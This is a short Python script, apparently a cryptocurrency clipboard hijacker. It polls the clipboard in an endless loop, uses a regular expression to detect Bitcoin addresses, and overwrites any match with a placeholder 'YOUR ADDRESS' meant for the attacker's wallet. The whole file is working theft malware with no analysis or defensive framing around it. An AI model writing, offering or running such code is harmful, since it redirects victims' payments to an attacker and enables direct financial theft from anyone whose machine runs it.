import re
import pyperclip
clipboarddata = ''
while 1 != 2:
    clipboarddata = pyperclip.paste()
    ourbtc = re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$',clipboarddata)
    if (ourbtc):
        pyperclip.copy("YOUR ADDRESS")
